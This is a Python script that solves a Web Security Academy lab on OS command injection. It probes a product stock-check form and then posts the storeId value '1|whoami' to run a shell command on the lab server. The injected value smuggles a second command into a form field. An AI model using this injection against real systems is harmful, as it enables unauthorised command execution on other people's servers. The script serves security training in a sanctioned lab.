# Lab: OS command injection, simple case

import requests

base = "https://0a7a00520394821f836ec3a0006000dd.web-security-academy.net"
s = requests.Session()

print("===========[step1] Check Product===============")
page_product=s.get(f"{base}/product", params={"productId": "1"})
page_product_result=page_product.text
print(page_product_result)
'''
[!] Found POST Method: 
                        <form id="stockCheckForm" action="/product/stock" method="POST">
                            <input required type="hidden" name="productId" value="1">
                            <select name="storeId">
                                <option value="1" >London</option>
                                <option value="2" >Paris</option>
                                <option value="3" >Milan</option>
                            </select>
                            <button type="submit" class="button">Check stock</button>
                        </form>
                        <span id="stockCheckResult"></span>
                        <script src="/resources/js/stockCheckPayload.js"></script>
                        <script src="/resources/js/stockCheck.js"></script>

'''

print("===========[step2] Check Stock===============")
page_stock=s.post(f"{base}/product/stock", data={"productId": "1", "storeId": "1"})
page_stock_result=page_stock.text
print(page_stock_result)

print("===========[step3] OS Command Injection===============")
page_stock=s.post(f"{base}/product/stock", data={"productId": "1", "storeId": "1|whoami"})
page_stock_result=page_stock.text
print(page_stock_result)
